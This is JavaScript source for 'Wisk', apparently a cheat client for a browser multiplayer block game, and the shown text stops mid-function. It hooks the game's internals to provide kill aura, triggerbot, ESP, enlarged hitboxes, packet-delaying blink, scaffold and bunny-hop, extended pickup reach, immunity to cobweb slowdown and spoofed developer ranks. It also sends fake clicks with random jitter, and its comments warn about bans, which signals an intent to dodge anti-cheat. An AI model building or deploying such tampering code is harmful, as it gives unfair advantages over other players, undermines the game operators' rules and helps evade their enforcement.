const ICON_URL = "data:image/jpeg;base64,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"

const defaultBackGroundTransparency = 8.2 //--------Background transparency

const defaultBackGroundBlur = 8 //------------------Background blur

let openKey = "r"; //-------------------------------DEFAULT OPEN CLOSE KEYBIND 💗

const TITLE = "Wisk" //-----------------------Title

const defaultGradient = `linear-gradient(to right, ${defaultColor}, #D3D3D3, #D3D3D3)`;
//--------------------------------------------------Three color gradient


let passiveFeaturesEnabled = true; //--------------Enable passive features?

const changeHealthBar = true // --------------------Change health bar color to gradient color
const spoofRanksEnabled = true; // -----------------Gives you all ranks (YT, Super, Developer)
const ATTACK_INTERVAL_MS = 200; // -----------------How fast to hit players with triggerbot/ aurAura    LOW = BAN
let desiredPotionSlot = 1 //------------------------What slot should potions go to? Numbers start at zero! 0-9
let spikeSlot = 8 //--------------------------------What slot do spikes automatically go in? 0-9
let webSlot = 9 //----------------------------------What slot do webs / nets automatically go in? 0-9

const STORAGE_KEY = "customKeybinds_v1";

// Default keybinds with actions
let defaultKeybindActions = [
    { name: "Spawn teleport", type: "mouse", code: 4, action: clickTeleportButton },
    { name: "SpikeWeb a player", type: "keyboard", code: "KeyF", action: autoSW },
    { name: "PickupReach", type: "keyboard", code: null, action: togglePickupReach },
    { name: "KillAura", type: "keyboard", code: null, action: toggleKillAura },
    { name: "Blink", type: "keyboard", code: null, action: toggleBlinkWrapper },
	{ name: "Scaffold", type: "keyboard", code: null, action: toggleScaffold },
    { name: "HitBoxes", type: "keyboard", code: null, action: toggleHitBoxes },
    { name: "Wireframe", type: "keyboard", code: null, action: toggleWireframe },
    { name: "ESP", type: "keyboard", code: null, action: toggleESP },
    { name: "BHOP", type: "keyboard", code: null, action: toggleBHOP },
    { name: "ChestESP", type: "keyboard", code: null, action: toggleChestESP },
    { name: "OreESP", type: "keyboard", code: null, action: toggleOreESP },
	{ name: "triggerBot", type: "keyboard", code: null, action: toggleTriggerBot },
    { name: "NameTags", type: "keyboard", code: null, action: toggleNameTags },
    { name: "Skybox", type: "keyboard", code: null, action: toggleSkybox },
    { name: "WallJump", type: "keyboard", code: null, action: toggleWallJumpScript },
    { name: "WaterJump", type: "keyboard", code: null, action: toggleLockPlayerWaterState },
];

// Load from localStorage
const storedKeybinds = localStorage.getItem(STORAGE_KEY);
if (storedKeybinds) {
    try {
        const parsed = JSON.parse(storedKeybinds);
        // Inject saved key codes into default actions
        defaultKeybindActions = defaultKeybindActions.map((bind) => {
            const saved = parsed.find((s) => s.name === bind.name);
            return saved ? { ...bind, code: saved.code } : bind;
        });
    } catch (e) {
        console.warn("Failed to parse saved keybinds:", e);
    }
}

// Your working keybinds
const keybindActions = defaultKeybindActions;


//__END__SETTINGS______________________________________________

// Credits to wang for the blinksState
// Thanks for helping me with a lot of stuff.
// (It is broken because of me not him)

let version = "0.3.8"
let alreadyConnected = null;
let colyRoom = null;
let sendBytesName = null;
let injectedBool = false;
let myId = 1
let isInitializing = true;
let clientOptions = null;
let shideFuxny = {};
let noaParent = null;
let noaKeyInParent = null;
let usingAltInjection = false;

let blinkState = {
    enabled: false,
    originalSendBytes: null,
    queued: [],
    interval: 0,
    noPacket: false
};


let wallJumpInterval = null;
let wallJumpRunning = false;


let lockPlayerWaterStateInterval = null;
let waterJumpingEnabled = false


let wireFramesBool = false;


let espEnabled = false;


let isSkyboxHidden = false;


let triggerBotEnabled = false;
let toggleTriggerBotInterval = null;


const possibleNames = [
    //"LegLeftMesh",
    //"LegRightMesh",
    //"TorsoNode",
    //"ArmLeftMesh",
    //"ArmRightMesh",
    "BodyMesh",
    'Body|Armour',
    //"HeadMesh"
]; // Potential detection: If the player has leg armour there is no way leftLegMesh could have been hit.
let killAuraEnabled = false
let killAuraIntervalId = null
let lastClosestId = null
let newBox = null;
let newBoxId = null;
let __nullKey = null; //Entity enabled key
let __stringKey = null; //Entity ID key "Then why didn't you just label them that?"
let animationFrameId = null;
let hitBoxEnabled = false;
const hitboxes = {};


let cachedNameTagParent = null;
let cachedBHOPParent = null;


let autoPotionEnabled = false;
let autoPotionInterval = null;


let nameTagsEnabled = false;
let nameTagsIntervalId = null;
let nameTagParent = null;


let bhopEnabled = false;
let bhopIntervalId = null;


let  scaffoldEnabled = false;
let scaffoldIntervalId = null;


let enemyHealthGuiEnabled = false;
let healthWatcherInterval = null;
let lastPercent = null;
let lastChangeTime = Date.now();
let resetTimeout = null;


let eIdKey = null;
let targetEntity = null;
let targetEntityDistance = null;


let pickupReachEnabled = false; //Credits to wang!!!!
let originalGetEntitiesInAABB = null;
const RANGE_MULTIPLIER = 5;
let ghMethodKey = null;
let proto = null;


let bhopKnifeEnabled = false;
let spaceVid;
let fadeVolumeInterval;
let spaceHeld = false;
let bigHeadsEnabled = false;


const scannedChunks = new Set();
let chunkDataField = null;

// ETC
let playerKey = null;
let moveState = null;
let physState = null;
let humanoidMeshlist = null;
let slowHitEnabled = null;


let everEnabled = {}



////////////////////////////////////////////////////////////////////////////////////////Main Functions

var r = { //WANG
    keys(e) {
        var t = [],
            o = 0;
        for (var s in e) e != null && (t[o] = s, o++);
        return t
    },
    values(e) {
        for (var t = this.keys(e), o = [], s = 0, i = 0; s < t.length;) {
            var l = t[s],
                d = e[l];
            o[i] = d, i++, s++
        }
        return o
    },
    assign(e, ...t) {
        let o = Object(e);
        for (let s = 0; s < t.length; s++) {
            let i = t[s];
            if (i != null)
                for (let l in i) o[l] = i[l]
        }
        return o
    }
};


function fadeVolume(from, to, duration) {
  const steps = 30;
  const stepTime = duration / steps;
  let current = 0;

  if (fadeVolumeInterval) clearInterval(fadeVolumeInterval);

  fadeVolumeInterval = setInterval(() => {
    current++;
    const progress = current / steps;
    spaceVid.volume = from + (to - from) * progress;

    if (current >= steps) {
      clearInterval(fadeVolumeInterval);
      fadeVolumeInterval = null;
    }
  }, stepTime * 1000);
}

function onKeyDown(e) {
  if (e.code === 'Space' && !spaceHeld) {
    spaceHeld = true;
    spaceVid.style.opacity = '1';
    spaceVid.play();
    fadeVolume(spaceVid.volume, 0.1, 2.5); // fade in to 0.8 over 2 seconds
  }
}


function onKeyUp(e) {
  if (e.code === 'Space') {
    spaceHeld = false;
    spaceVid.style.opacity = '0';
    fadeVolume(spaceVid.volume, 0.1, 2.5); //
    setTimeout(() => {
      if (!spaceHeld) spaceVid.pause();
    }, 500);
  }
}

function toggleBhopKnife() {
	    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
  if (!bhopKnifeEnabled) {
    everEnabled.bhopKnifeEnabled = true;
    bhopKnifeEnabled = true;

    spaceVid = document.createElement('video');
    spaceVid.src = 'https://files.catbox.moe/6tm4e7.webm';
    spaceVid.preload = 'auto';
    spaceVid.loop = true;
    spaceVid.muted = false;
    spaceVid.volume = 0;
    spaceVid.playbackRate = 1;
    spaceVid.playsInline = true;

    Object.assign(spaceVid.style, {
      position: 'fixed',
      top: '50%',
      left: '50%',
      width: '100vw',
      height: '100vh',
      objectFit: 'cover',
      transform: 'translate(-50%, -50%) scaleX(1.4)', // Stretch only width
      zIndex: 21,
      pointerEvents: 'none',
      opacity: '0',
      transition: 'opacity 2.5s ease',
    });

    document.body.appendChild(spaceVid);

    window.addEventListener('keydown', onKeyDown);
    window.addEventListener('keyup', onKeyUp);

  } else {
    // Disable
    bhopKnifeEnabled = false;

    window.removeEventListener('keydown', onKeyDown);
    window.removeEventListener('keyup', onKeyUp);

    if (spaceVid) {
      spaceVid.pause();
      if (spaceVid.parentNode) spaceVid.parentNode.removeChild(spaceVid);
      spaceVid = null;
    }

    spaceHeld = false;
    if (fadeVolumeInterval) clearInterval(fadeVolumeInterval);
  }
  updateKnifeButton();
}


function toggleSlowHit() {
    slowHitEnabled = !slowHitEnabled; // Toggle the boolean
    playerEntity.heldItemState.swingDuration = slowHitEnabled ? 1500 : 200;
    updateSlowHit(); // Call your update function
}


function matchesAllPatterns(fn) {
    const patterns = ["this.names.position", ".base[0]"].map(p => p.replace(/\s+/g, ''));
    try {
        const src = fn.toString().replace(/\s+/g, '');
        return patterns.every(p => src.includes(p));
    } catch {
        return false;
    }
}

function findClassConstructor(obj) {
    let current = obj;
    while (current) {
        for (const key of Reflect.ownKeys(current)) {
            let val;
            try {
                const desc = Object.getOwnPropertyDescriptor(current, key);
                val = desc?.value ?? current[key];
            } catch {
                continue;
            }
            if (typeof val === "function" && matchesAllPatterns(val)) {
                return val;
            }
        }
        current = Object.getPrototypeOf(current);
    }
    return null;
}

function findGhMethod(clsConstructor) {
    const protoLocal = clsConstructor?.prototype;
    if (!protoLocal) return null;

    for (const key of Reflect.ownKeys(protoLocal)) {
        if (key === "constructor") continue;
        const fn = protoLocal[key];
        if (typeof fn === "function" && matchesAllPatterns(fn)) {
            return {
                fn,
                key
            };
        }
    }
    return null;
}



function toggleScaffold() {
    scaffoldEnabled = !scaffoldEnabled;
	everEnabled.scaffoldEnabled = true;
    if (scaffoldEnabled) {
        scaffoldIntervalId = setInterval(() => {
            const pos = shideFuxny.entities.getState(1, 'position').position;
			if (!pos || playerEntity.heldItemState.heldType !== "CubeBlock") return;


            const exactX = pos[0];
            const exactZ = pos[2];

            const blockX = Math.floor(exactX);
            const blockY = Math.floor(pos[1]);
            const blockZ = Math.floor(exactZ);

            const checkPlace = (x, y, z) => {
                return (
                    playerEntity.checkTargetedBlockCanBePlacedOver([x, y, z]) ||
                    r.values(shideFuxny.world)[47].call(shideFuxny.world, x, y, z) === 0
                );
            };

            // Step 1: try block directly below
            if (checkPlace(blockX, blockY - 1, blockZ)) {
                wangPlace([blockX, blockY - 1, blockZ]);
                return;
            }

            // Step 2: check lean direction (just 4 directions)
            const dx = exactX - blockX;
            const dz = exactZ - blockZ;

            const offsets = [];

            if (dx < 0.3) offsets.push([-1, 0]); // leaning west
            if (dx > 0.7) offsets.push([1, 0]);  // leaning east
            if (dz < 0.3) offsets.push([0, -1]); // leaning north
            if (dz > 0.7) offsets.push([0, 1]);  // leaning south

            for (const [ox, oz] of offsets) {
                const nx = blockX + ox;
                const nz = blockZ + oz;
                if (checkPlace(nx, blockY - 1, nz)) {
                    wangPlace([nx, blockY - 1, nz]);
                    return;
                }
            }

        }, 50);
    } else {
        clearInterval(scaffoldIntervalId);
        scaffoldIntervalId = null;
    }
	updateScaffoldButton();
}



function togglePickupReach() {
    if (!injectedBool) {

        showTemporaryNotification('You need to inject first habibi!')

    }
    if (!proto || !originalGetEntitiesInAABB) {
        const cls = findClassConstructor(shideFuxny.NIGHT.entities);
        if (!cls) {
            console.warn("[pickupReach] Could not find class constructor");
            return;
        }

        const ghMethod = findGhMethod(cls);
        if (!ghMethod) {
            console.warn("[pickupReach] Could not find getEntitiesInAABB method");
            return;
        }

        proto = cls.prototype;
        originalGetEntitiesInAABB = ghMethod.fn;
        ghMethodKey = ghMethod.key;
    }

    if (pickupReachEnabled) {
        // Disable patch
        proto[ghMethodKey] = originalGetEntitiesInAABB;
        pickupReachEnabled = false;
        console.log("[pickupReach] Patch disabled");
    } else {
		everEnabled.pickupReachEnabled = true;
        // Enable patch
        proto[ghMethodKey] = function(box, name) {
            const center = [
                (box.base[0] + box.max[0]) / 2,
                (box.base[1] + box.max[1]) / 2,
                (box.base[2] + box.max[2]) / 2,
            ];
            const halfSize = [
                (box.max[0] - box.base[0]) / 2,
                (box.max[1] - box.base[1]) / 2,
                (box.max[2] - box.base[2]) / 2,
            ];

            const enlarged = {
                base: center.map((c, i) => c - halfSize[i] * RANGE_MULTIPLIER),
                max: center.map((c, i) => c + halfSize[i] * RANGE_MULTIPLIER)
            };

            return originalGetEntitiesInAABB.call(this, enlarged, name);
        };
        pickupReachEnabled = true;
        console.log("[pickupReach] Patch enabled");
    }
    updatePickupReachButton()
}

function passiveFeatures() {
if (passiveFeaturesEnabled) {
		everEnabled.passiveFeaturesEnabled = true;
	    if (changeHealthBar) {
        (function() { // FROM ENTITY
            'use strict';

            const healthBar = document.getElementsByClassName("BottomScreenStatBar")[0];

            if (healthBar) {
                // Clear all conflicting styles
                healthBar.style.background = defaultGradient;
                healthBar.style.backgroundColor = 'transparent';
                healthBar.style.boxShadow = 'none';
                healthBar.style.border = 'none';
                healthBar.style.backgroundRepeat = 'no-repeat';
                healthBar.style.backgroundSize = '100% 100%';
                healthBar.style.outline = 'none';

                // Also fix child elements (some bars use internal fill divs)
                for (const child of healthBar.children) {
                    child.style.background = 'transparent';
                    child.style.backgroundColor = 'transparent';
                    child.style.boxShadow = 'none';
                    child.style.border = 'none';
                }

                // Force override with CSS injection if still persists
                const style = document.createElement('style');
                style.textContent = `
            .BottomScreenStatBar {
                background: ${defaultGradient} !important;
                background-size: 100% 100% !important;
                background-repeat: no-repeat !important;
                box-shadow: none !important;
                border: none !important;
            }
            .BottomScreenStatBar * {
                background: transparent !important;
                background-color: transparent !important;
                box-shadow: none !important;
                border: none !important;
            }
        `;
                document.head.appendChild(style);

                console.log("✅ Applied clean default gradient to health bar");
            } else {
                console.warn("❌ Could not find health bar element");
            }
        })();
    }

    ////////Anti-cobweb
    Object.defineProperty(shideFuxny.entities[shideFuxny.impKey].moveState.list[0].speedMultiplier.multipliers, "inCobweb", {
        configurable: true,
        enumerable: true,
        get() {
            return 1; // always return 1
        },
        set(value) {
            // ignore all attempts to change it
        }
    });

    if (spoofRanksEnabled) {
        shideFuxny.entityList[1][1].ranks[0] = "developer";
        shideFuxny.entityList[1][1].ranks[1] = "youtuber";
        shideFuxny.entityList[1][1].ranks[2] = "super";
    } else {

    }


}

}



function emitSafePrimaryFire() {
const fakeEvent = {
  timeStamp: performance.now(),
  altKey: false,
  ctrlKey: false,
  shiftKey: false,
  metaKey: false,
  button: 0, // left click
  buttons: 1, // left button pressed
  clientX: innerWidth / 2 + Math.floor(Math.random() * 4 - 2),
  clientY: innerHeight / 2 + Math.floor(Math.random() * 4 - 2),
  screenX: screen.width / 2,
  screenY: screen.height / 2
};

    shideFuxny.NIGHT.inputs.down.emit("primary-fire", fakeEvent);
}



function inMenu() {
    const requests = shideFuxny.Props.pointerLockWrapper.pointerUnlockRequests;
    return requests.includes("SettingsMenuComponent") || requests.includes("InGameMenu");
}


function movePotionToSlot() {
    if (!playerInventoryParent || !playerInventoryParent.playerInventory?.items) {
        console.warn("❌ playerInventoryParent is not set. Run findAndSavePlayerInventoryParent() first.");
        return false;
    }
    const items = playerInventoryParent.playerInventory.items;
    let potionSlot = null;
    for (let i = desiredPotionSlot; i < items.length; i++) {
        const item = items[i];
        if (!item || typeof item.name !== 'string') continue;
        const name = item.name.toLowerCase();
        if (
            name.includes("potion") &&
            name.includes("splash") &&
            (name.includes("healing") || name.includes("shield"))
        ) {


            potionSlot = i;
            break;
        }
    }
    if (potionSlot === null) {
        return false;
    }
    console.log(`🔁 Swapping potion from slot ${potionSlot} with slot ${desiredPotionSlot}`);
    playerInventoryParent.swapPosClient(potionSlot, desiredPotionSlot, null);
    return true;
}




function makeHitboxes() {
    if (!injectedBool) {
